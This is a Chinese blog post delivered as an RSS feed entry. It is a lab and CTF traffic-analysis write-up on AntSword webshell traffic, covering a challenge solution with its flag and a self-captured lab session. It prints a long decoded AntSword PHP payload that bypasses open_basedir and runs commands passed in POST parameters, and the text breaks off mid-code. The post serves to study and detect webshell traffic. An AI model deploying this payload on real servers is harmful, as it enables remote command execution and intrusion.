<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Hexo • Posts by &#34;流量&#34; category</title>
        <link>https://nnnpc.github.io</link>
        <description></description>
        <language>en</language>
        <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
        <lastBuildDate>Tue, 16 Apr 2024 13:58:19 +0800</lastBuildDate>
        <category>MISC</category>
        <category>WEB</category>
        <category>流量</category>
        <category>渗透</category>
        <category>python</category>
        <category>GO</category>
        <category>其它</category>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</guid>
            <title>蚁剑流量浅析</title>
            <link>https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;最近回顾了一道蚁剑的流量分析题目，就像借着这个机会记录一下学习内容&lt;/p&gt;
&lt;p&gt;先看题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;题目是 2022DASCTF Apr X FATE 防疫挑战赛的流量分析题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先打开流量包，查看下 tcp 追踪流&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BrLogKUK1bDSvRZr.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现了流 52 有带有 flag.txt 字样的 zip&lt;/p&gt;
&lt;p&gt;可以手动分离也可以 binwalk 或者 foremost，分离出压缩包发现是加密的&lt;/p&gt;
&lt;p&gt;那就需要找到压缩包密码，去看看之前的追踪流&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UGnmP5f9GfMOWbOv.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在流 50 找到了压缩包的加密过程，解码上面的密文进行阅读分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9nPVl560teeyA72N.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这里发现了压缩包的密码 PaSsZiPWorD&lt;/p&gt;
&lt;p&gt;解压压缩包得到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4pRBtAmR7ryLDMEa.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DASCTF{f3f32f434eddbc6e6b5043373af95ae8}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;题目做完了就想着自己去截取流量分析一下，于是就在 ctfshow 开了一个文件上传的环境&lt;/p&gt;
&lt;p&gt;成功将马上传了之后使用蚁剑 getshell，这里是不使用任何的加密方式，采用蚁剑的虚拟终端敲了两个命令来获取 flag，截取流量进行分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5nse7uTKfmarqikw.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uKWFk0WTCHMdIyDo.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;wireshark 捕获设置为 WLAN 之后点击开始，截取之后进行分析&lt;/p&gt;
&lt;p&gt;tcp 流 22：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZNH5ygLPLBzjGR5c.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功截取&lt;/p&gt;
&lt;p&gt;观察 tcp 追踪流，这里也显示了蚁剑流量的一个明显的特征：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a=@ini_set(&amp;quot;display_errors&amp;quot;, &amp;quot;0&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个在蚁剑当中是以明文的方式出现的，而其他的 webshell 管理工具一般会进行加密，继续分析，这里是蚁剑中虚拟终端输入的第一个命令&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2ia6d6zo2vGm9RB1.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;将该流的这个 base64 解码能够看到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1PFy377d6fTcYlVm.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到后面的流一样显示截取的蚁剑流量&lt;/p&gt;
&lt;p&gt;tcp 流 33：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1W9vgNWmiVUPrsLx.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;该流就是输入的第二个命令了，就不演示解码了，同时在 http 流能够看到 cat&lt;br&gt;
flag.php 之后的具体内容&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vgvaL6WS3qnbyt6j.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样的&lt;/p&gt;
&lt;p&gt;继续使用 base64 加解密的方式对数据进行数据处理试试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AX7a0hdjCIhiohFQ.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;保存数据，用虚拟终端输入命令获取 flag 进行测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YLmJEgedd3h8dOmk.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以仔细看看加密之后的一整串 base64 解码之后的样子，这里以 tcp 流 5 为例&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q6Gf7Y2aPhC0KeeW.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行解码得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jhtAGxmT8JxJ9qmp.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;方便查看可以格式化一下代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@ini_set(&amp;quot;display_errors&amp;quot;, &amp;quot;0&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@set_time_limit(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$opdir=@ini_get(&amp;quot;open_basedir&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if($opdir) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$ocwd=dirname($_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$oparr=preg_split(&amp;quot;/;|:/&amp;quot;,$opdir);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	@array_push($oparr,$ocwd,sys_get_temp_dir());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	foreach($oparr as $item) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if(!@is_writable($item)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			continue;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$tmdir=$item.&amp;quot;/.6a33b73913&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@mkdir($tmdir);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if(!@file_exists($tmdir)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			continue;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@chdir($tmdir);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@ini_set(&amp;quot;open_basedir&amp;quot;, &amp;quot;..&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$cntarr=@preg_split(&amp;quot;/\\\\|\//&amp;quot;,$tmdir);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for ($i=0;$i&amp;lt;sizeof($cntarr);$i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@chdir(&amp;quot;..&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@ini_set(&amp;quot;open_basedir&amp;quot;,&amp;quot;/&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@rmdir($tmdir);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		break;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function asenc($out) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return @base64_encode($out);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function asoutput() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$output=ob_get_contents();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ob_end_clean();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;quot;95&amp;quot;.&amp;quot;44e&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo @asenc($output);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;quot;1911&amp;quot;.&amp;quot;b6c9&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ob_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$p=base64_decode(substr($_POST[&amp;quot;ka199f64875418&amp;quot;],2));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$s=base64_decode(substr($_POST[&amp;quot;n7573f80f63f59&amp;quot;],2));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$envstr=@base64_decode(substr($_POST[&amp;quot;w2b059d24e126c&amp;quot;],2));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$d=dirname($_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$c=substr($d,0,1)==&amp;quot;/&amp;quot;?&amp;quot;-c \&amp;quot;&amp;#123;$s&amp;#125;\&amp;quot;&amp;quot;:&amp;quot;/c \&amp;quot;&amp;#123;$s&amp;#125;\&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if(substr($d,0,1)==&amp;quot;/&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@putenv(&amp;quot;PATH=&amp;quot;.getenv(&amp;quot;PATH&amp;quot;).&amp;quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		@putenv(&amp;quot;PATH=&amp;quot;.getenv(&amp;quot;PATH&amp;quot;).&amp;quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if(!empty($envstr)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$envarr=explode(&amp;quot;|||asline|||&amp;quot;, $envstr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		foreach($envarr as $v) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if (!empty($v)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				@putenv(str_replace(&amp;quot;|||askey|||&amp;quot;, &amp;quot;=&amp;quot;, $v));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$r=&amp;quot;&amp;#123;$p&amp;#125; &amp;#123;$c&amp;#125;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	function fe($f) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$d=explode(&amp;quot;,&amp;quot;,@ini_get(&amp;quot;disable_functions&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if(empty($d)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$d=array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$d=array_map(&amp;#x27;trim&amp;#x27;,array_map(&amp;#x27;strtolower&amp;#x27;,$d));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return(function_exists($f)&amp;amp;&amp;amp;is_callable($f)&amp;amp;&amp;amp;!in_array($f,$d));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	function runshellshock($d, $c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if (substr($d, 0, 1) == &amp;quot;/&amp;quot; &amp;amp;&amp;amp; fe(&amp;#x27;putenv&amp;#x27;) &amp;amp;&amp;amp; (fe(&amp;#x27;error_log&amp;#x27;) || fe(&amp;#x27;mail&amp;#x27;))) 